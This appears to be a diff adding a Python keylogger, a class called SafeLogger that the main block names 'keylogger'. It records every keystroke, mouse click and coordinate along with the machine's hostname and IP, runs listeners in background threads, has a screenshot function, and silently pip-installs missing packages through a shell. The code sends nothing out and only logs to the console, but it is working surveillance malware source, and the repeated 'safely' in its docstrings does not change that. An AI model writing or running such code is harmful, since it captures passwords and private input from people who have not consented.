@@ -1,0 +1,98 @@
+try:
+    import logging
+    import os
+    import platform
+    import socket
+    import threading
+    import pyscreenshot
+    import sounddevice as sd
+    from pynput import keyboard, mouse
+    from pynput.keyboard import Listener as KeyboardListener
+    from pynput.mouse import Listener as MouseListener
+except ModuleNotFoundError:
+    from subprocess import call
+    modules = ["pyscreenshot", "sounddevice", "pynput"]
+    call("pip install " + ' '.join(modules), shell=True)
+
+
+class SafeLogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = "Logger initialized..."
+        self.hostname_info()
+
+    def append_log(self, string):
+        """Append strings to the log."""
+        self.log += f"\n{string}"
+        logging.info(string)
+
+    def hostname_info(self):
+        """Log basic system information safely."""
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
+        system_platform = platform.system()
+        machine_type = platform.machine()
+        system_info = f"Hostname: {hostname}, IP: {ip_address}, OS: {system_platform}, Machine: {machine_type}"
+        self.append_log(system_info)
+
+    def on_keyboard_event(self, key):
+        """Capture keyboard keypress safely."""
+        try:
+            self.append_log(f"Key pressed: {key.char}")
+        except AttributeError:
+            self.append_log(f"Special key pressed: {key}")
+
+    def on_mouse_click(self, x, y, button, pressed):
+        """Log mouse click events."""
+        event_type = "pressed" if pressed else "released"
+        self.append_log(f"Mouse {event_type} at coordinates ({x}, {y}) using button {button}")
+
+    def take_screenshot(self):
+        """Take a screenshot safely using pyscreenshot."""
+        screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
+        img = pyscreenshot.grab()
+        img.save(screenshot_path)
+        self.append_log(f"Screenshot taken and saved to: {screenshot_path}")
+
+    def monitor_keyboard(self):
+        """Start keyboard monitoring safely."""
+        with KeyboardListener(on_press=self.on_keyboard_event) as listener:
+            listener.join()
+
+    def monitor_mouse(self):
+        """Start mouse monitoring safely."""
+        with MouseListener(
+            on_click=self.on_mouse_click
+        ) as listener:
+            listener.join()
+
+    def periodic_report(self):
+        """Periodically log the data to console every interval."""
+        self.append_log(f"Periodic Report:\n{self.log}")
+        self.log = ""
+        threading.Timer(self.interval, self.periodic_report).start()
+
+    def run(self):
+        """Run the logger safely."""
+        logging.basicConfig(level=logging.INFO)
+        self.periodic_report()
+        
+        # Starting keyboard and mouse listeners
+        keyboard_thread = threading.Thread(target=self.monitor_keyboard, daemon=True)
+        mouse_thread = threading.Thread(target=self.monitor_mouse, daemon=True)
+
+        keyboard_thread.start()
+        mouse_thread.start()
+
+        # Keep the main thread alive
+        keyboard_thread.join()
+        mouse_thread.join()
+
+
+if __name__ == "__main__":
+    # Configuration
+    SEND_REPORT_INTERVAL = 60  # Interval in seconds
+
+    # Start the logger
+    keylogger = SafeLogger(SEND_REPORT_INTERVAL)
+    keylogger.run()
